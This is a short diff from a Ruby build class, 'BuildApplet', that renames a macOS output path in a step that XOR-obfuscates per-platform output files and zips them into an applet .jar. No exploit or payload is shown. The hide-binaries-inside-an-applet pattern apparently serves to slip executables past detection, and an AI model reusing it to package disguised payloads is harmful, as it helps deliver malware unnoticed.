@@ -74,7 +74,7 @@ class BuildApplet < Build
 
     #obfuscate output_* with xor 0xff 
     xor_encrypt(path('output_windows'), path('w')) if File.exists? path('output_windows')
-    xor_encrypt(path('output_mac'), path('m')) if File.exists? path('output_mac')
+    xor_encrypt(path('output_osx'), path('m')) if File.exists? path('output_osx')
 
     CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} w", {:chdir => path('')} if File.exist? path('w')
     CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} m", {:chdir => path('')} if File.exist? path('m')
